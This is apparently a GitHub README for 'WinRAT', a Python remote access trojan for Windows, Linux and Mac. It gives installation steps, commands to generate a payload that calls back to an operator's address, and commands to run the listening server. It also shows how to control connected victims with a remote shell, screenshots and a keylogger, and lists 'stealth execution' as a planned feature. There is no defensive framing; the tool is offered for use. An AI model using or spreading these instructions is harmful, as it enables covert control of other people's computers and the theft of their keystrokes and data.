<h1 align="center"> 
    <img src="https://1.bp.blogspot.com/-bIFInkmTIjc/X9HamnJryDI/AAAAAAAAAvk/m1Gd-zUWTm82285JLa_1TgIpSPYt6dKJACLcBGAsYHQ/s2896/WinRAT.png" alt="WinRAT" /> <br>    
    WinRAT
</h1>
<p align="center">
    <a href="#" target="_blank"><img src="https://img.shields.io/badge/platform-cross-important" alt="platform: cross" /></a>
    <a href="https://www.python.org/" target="_blank"><img src="https://img.shields.io/badge/Python-3-yellow.svg?logo=python" alt="Python: 3" /></a>
    <a href="https://github.com/muneebwanee/WinRAT/releases" target="_blank"><img src="https://img.shields.io/badge/version-v1.0-blue.svg?logo=moo" alt="Release: v3.1" /></a>
    <a href="https://opensource.org/licenses/MIT" target="_blank"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="lisence" /></a>
</p>
<h4 align="center"> A Cross Platform multifunctional (Windows/Linux/Mac) RAT.</h4>

<h6 align="center"><img src="https://1.bp.blogspot.com/-ileKo-193NE/X9HeHFHI3yI/AAAAAAAAAwA/x0J3HWIh7y4wRLrswJsX34Lt09oGEVRVwCLcBGAsYHQ/s2195/WinRAT.png"></h6>

## Getting Started
### Description
A cross platform RAT written in pure Python. The RAT accept commands alongside arguments to either perform as the server who accepts connections or to perform as the client/target who establish connections to the server. The **generate** command uses the module **pyinstaller** to compile the actual payload code. So, in order to generate payload file for your respective platform, you need to be on that platform while generating the file. Moreover, you can directly get the source file as well. 

### Features
<ul>
    <li>Built-in Shell for command execution</li>
    <li>Dumping System Information including drives and rams</li>
    <li>Screenshot module. Captures screenshot of client screen.</li>
    <li>Connection Loop (Will continue on connecting to server)</li>
    <li>Currently, it uses BASE64 encoding. </li>
    <li>Pure Python</li>
    <li>Cross Platform. (Tested on Linux. Errors are accepted)</li>
    <li>Source File included for testing</li>
    <li>Python 3</li>
</ul>

### To be expected in future
<ul>
    <li>Stealth Execution</li>
    <li>Encryption</li>
    <li>Storing Sessions from last attempt</li>
    <li>Pushing Notifications when a client connects</li>
</ul>

### Installation
The tool is tested on **Parrot OS** with **Python 3.8**. 
Follow the steps for installation:
```
$ git clone https://github.com/muneebwanee/WinRAT.git
$ cd WinRAT/
$ pip3 install -r requirements.txt
```

## Documentation
### Generating Payload
You can get the payload file in two ways: 
<ul>
    <li>Source File</li>
    <li>Compiled File</li>
</ul>
The source file is to remain same on all platforms. So, you can generate it on one platform and use it on the other. Getting the source file: 

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
```

The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
```

<h6 align="center"><img src="https://1.bp.blogspot.com/-MPT_vanIA-0/X9HfzBocWyI/AAAAAAAAAwM/VsgW76tPWeMbWqOGECEC68FqJpzimUG-ACLcBGAsYHQ/s2048/WinRAT.png"></h6>

Replace your IP Address and Port on above commands. 

### Running Server
The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
```
$ python3 winrat.py bind --address 0.0.0.0 --port 2999
```

### Connections
All the connections will be listed under **sessions** command:
```
$ sessions
```

<h6 align="center"><img src="https://1.bp.blogspot.com/--CU93TSA5hQ/X9HhV5axm6I/AAAAAAAAAwo/eV1W_MOM2_g9lwWBI44GPMoBYJRgHsOvgCLcBGAsYHQ/s2186/WinRAT.png"></h6>

You can connect to you target session with **connect** command and launch one of available commands: 
```
$ connect ID
$ keylogger on
$ keylogger dump
$ screenshot
```


### Help
Get a list of available commands: 
```
$ help
```

Help on a Specific Command:
```
$ help COMMAND
```

<p align="center">
<a href="#"><img title="Version" src="https://img.shields.io/badge/Version-1.0-green.svg?style=flat-square"></a>
<a href="https://github.com/muneebwanee"><img title="Followers" src="https://img.shields.io/github/followers/muneebwanee?color=blue&style=flat-square"></a>
<a href="https://twitter.com/muneebwanee"><img title="Twitter" src="https://img.shields.io/twitter/follow/muneebwanee?style=social"></a>
<a href="https://twitter.com/the_deepnet"><img title="Contributer" src="https://img.shields.io/twitter/follow/the_deepnet?label=%40the_deepnet&style=social"></a>
<a href="https://instagram.com/muneebwanee"><img title="Instagram" src="https://img.shields.io/badge/IG-%40muneebwanee-red?style=for-the-badge&logo=instagram"></a>
<a href="https://linkedin.com/in/muneebwanee"><img title="LinkedIn" src="https://img.shields.io/badge/LinkedIn%20-muneebwanee-orange?colorA=%23ff9696&colorB=%237E7B4E&style=for-the-badge"></a>
<a href="https://m.me/me.muneebwanee"><img title="Facebook" src="https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger"></a>
<a href="https://github.com/muneebwanee"><img title="GitHub" src="https://img.shields.io/badge/Github-Muneeb--Wanee-green?style=for-the-badge&logo=github"></a>
<a href="https://www.buymeacoffee.com/muneebwanee" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
</p>
